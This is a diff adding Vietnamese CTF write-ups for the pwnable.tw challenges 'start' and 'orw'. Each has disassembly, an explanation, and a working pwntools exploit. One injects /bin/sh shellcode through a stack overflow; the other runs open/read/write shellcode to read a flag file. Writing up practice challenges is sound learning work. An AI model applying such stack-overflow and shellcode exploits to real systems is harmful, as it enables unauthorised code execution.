@@ -578,4 +578,170 @@ exploit()
 Done !
 
 
+# PWNABLE.TW
+## Start
 
+Đề bài cung cấp cho chúng ta 1 file chương trình trên Linux, vì vậy để biết thì chúng ta phải xem thử xem nó làm cái gì nào!
+.....
+Sau khi chạy thì thấy rằng chương trình in ra dòng *Let's start the CTF:* sau đó get chuỗi chúng ta nhập vào bằng cách nào đó, để biết được cấu trúc chương trình thì chúng ta dùng gdb để disassemble chương trình ra và được hàm _start: 
+```
+   0x08048060 <+0>:	push   esp
+   0x08048061 <+1>:	push   0x804809d
+   0x08048066 <+6>:	xor    eax,eax
+   0x08048068 <+8>:	xor    ebx,ebx
+   0x0804806a <+10>:	xor    ecx,ecx
+   0x0804806c <+12>:	xor    edx,edx
+   0x0804806e <+14>:	push   0x3a465443
+   0x08048073 <+19>:	push   0x20656874
+   0x08048078 <+24>:	push   0x20747261
+   0x0804807d <+29>:	push   0x74732073
+   0x08048082 <+34>:	push   0x2774654c
+   0x08048087 <+39>:	mov    ecx,esp
+   0x08048089 <+41>:	mov    dl,0x14
+   0x0804808b <+43>:	mov    bl,0x1
+   0x0804808d <+45>:	mov    al,0x4
+   0x0804808f <+47>:	int    0x80
+   0x08048091 <+49>:	xor    ebx,ebx
+   0x08048093 <+51>:	mov    dl,0x3c
+   0x08048095 <+53>:	mov    al,0x3
+   0x08048097 <+55>:	int    0x80
+   0x08048099 <+57>:	add    esp,0x14
+   0x0804809c <+60>:	ret    
+
+```
+Như chúng ta thấy thì code asm này khá thô, code dùng những phương thức đơn giản nhất đó chính là sys_call, ví dụ khi eax = 1 thì gọi sys_exit, sys_read = 3, sys_write = 4 ,...
+Về việc in ra dòng *Let's start the CTF:* thì chương trình chỉ push chuỗi dưới dạng hex vào stack sau đó gọi sys_write để in ra mà thôi! 
+
+Sau đó gọi sys_read để đọc input vào và tăng esp lên 0x14 để ret. Điều đó làm mình có thể suy đoán là stack này sẽ có độ dài là 0x14. 
+
+Vậy thì không có lỗ hổng thông thường nào như gets(), ... được xuất hiện ở đây, điều đó có nghĩa là chúng ta chỉ việc đưa shellcode vào stack và thực hiện shell thôi!
+Để thực hiện được việc gọi shellcode quyền năng là "/bin/sh" thì chúng ta search gg có shellcode sau : 
+```
+shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+```
+Sau đó yêu cầu tiếp theo là chúng ta phải tìm được esp_addr thì mới có thể add shellcode vào và thực thi được, để tìm được thì chúng ta chú ý câu lệnh *" 0x08048087 <+39>:	mov    ecx,esp"* câu lệnh này có nghĩa là esp sẽ được đưa vào ecx nên từ đấy chúng ta có thể leak được esp sau đó tính toán stack trả về và đưa shellcode vào : 
+
+```
+from pwn import *
+
+BIN = "./start"
+DEBUG = 1
+
+shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+addr = 0x08048087 
+
+io = process(BIN)
+context.log_level = 'debug'
+# io = remote("chall.pwnable.tw", 10000)
+
+
+#_breakpoint = """
+#		0x08048099
+#	"""
+#gdb.attach(io,_breakpoint)
+io.recvuntil("CTF:")
+payload = b'A' * 0x14 + p32(addr)
+io.send(payload)
+esp_addr = u32(io.recv(4))
+ 
+print("[+]Esp address = ", hex(esp_addr))
+ 
+payload = b'A' * 0x14 + p32(esp_addr + 0x14) + shellcode
+io.sendline(payload)
+io.interactive()
+```
+
+## orw
+
+Bài này thì đề như là đề mở vậy vì đề bài đã hướng dẫn cả rồi:
+```
+Read the flag from /home/orw/flag.
+Only open read write syscall are allowed to use.
+```
+
+Còn khi vào chạy thử thì chương trình in ra chuỗi *"Give my your shellcode:"* không biết phải trêu mình hay không, nhưng mà vẫn nên disassemble cho chắc ăn vậy 😆😆😆
+
+```
+0x08048548 <+0>:	lea    ecx,[esp+0x4]
+   0x0804854c <+4>:	and    esp,0xfffffff0
+   0x0804854f <+7>:	push   DWORD PTR [ecx-0x4]
+   0x08048552 <+10>:	push   ebp
+   0x08048553 <+11>:	mov    ebp,esp
+   0x08048555 <+13>:	push   ecx
+   0x08048556 <+14>:	sub    esp,0x4
+   0x08048559 <+17>:	call   0x80484cb <orw_seccomp>
+   0x0804855e <+22>:	sub    esp,0xc
+   0x08048561 <+25>:	push   0x80486a0
+   0x08048566 <+30>:	call   0x8048380 <printf@plt>
+   0x0804856b <+35>:	add    esp,0x10
+   0x0804856e <+38>:	sub    esp,0x4
+   0x08048571 <+41>:	push   0xc8
+   0x08048576 <+46>:	push   0x804a060
+   0x0804857b <+51>:	push   0x0
+   0x0804857d <+53>:	call   0x8048370 <read@plt>
+   0x08048582 <+58>:	add    esp,0x10
+   0x08048585 <+61>:	mov    eax,0x804a060
+   0x0804858a <+66>:	call   eax
+   0x0804858c <+68>:	mov    eax,0x0
+   0x08048591 <+73>:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048594 <+76>:	leave  
+   0x08048595 <+77>:	lea    esp,[ecx-0x4]
+   0x08048598 <+80>:	ret    
+
+```
+
+Bài này đã dùng 1 phiên bản nâng cấp hơn của asm so với bài trước để viết, dùng nhiều hàm hơn như hàm printf@plt,read@plt,... và cả hàm [orw_seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html) về cơ bản thì orw_seccomp là 1 hàm lọc sys_call, nên là như đề bài cho thì chỉ có sys_open = 5, sys_read = 3, sys_write = 4 là được cho phép!
+
+Với dữ kiện là địa chỉ của file flag và 3 phương thức trên thì bài này chủ yếu sẽ là mình viết ra được cái shellcode để lấy được flag về và in ra! Điều đó có nghĩa flow sẽ là :
+```
+sys_open(filename="/home/orw/flag")
+sys_read()
+sys_write()
+```
+
+Dựa vào luồng ở trên thì chúng ta phải cố gắng search gg 7749 cách để viết ra được cái shellcode dạng code asm như sau : 
+Đầu tiên phải chuyển string sang bytes : 
+```
+/home/orw/flag = 2f 68 6f 6d  65 2f 6f 72  77 2f 66 6c  61 67
+```
+Vậy push chuỗi lần lượt là :
+```
+push 0x6761;
+push 0x6c662f77;
+push 0x726f2f65;
+push 0x6d6f682f;
+mov eax,0x5;  sys_open
+mov ebx,esp;  push str
+int 0x80; 
+mov eax,0x3;  sys_read file
+mov ebx,0x3;
+mov edx,0x30;
+int 0x80
+mov eax,0x4;  sys_write 
+mov ebx,0x1;
+mov edx,0x30;
+int 0x80
+```
+Viết được cái shellcode này là ăn chắc được 60% rồi ! 
+Sau đó dùng hàm asm() trong pwntool để chuyển sang bytes và đưa vào shellcode rồi viết file exploit thôi 😄😄
+
+```
+from pwn import *
+
+filename="push 0x6761; push 0x6c662f77; push 0x726f2f65; push 0x6d6f682f"
+sys_open=";mov eax,0x5;mov ebx,esp;int 0x80;"
+sys_read="mov eax,0x3;mov ebx,0x3;mov edx,0x30;int 0x80;"
+sys_write="mov eax,0x4;mov ebx,0x1;mov edx,0x30;int 0x80;"
+
+shellcode=asm(filename+sys_open+sys_read+sys_write)
+
+payload=shellcode
+s=remote('chall.pwnable.tw',10001)
+print(s.recv(1024))
+s.sendline(payload)
+
+print(s.recv())
+s.interactive()
+
+```
+Done! :< 😆😆😆 🦈🦈🦈🦈
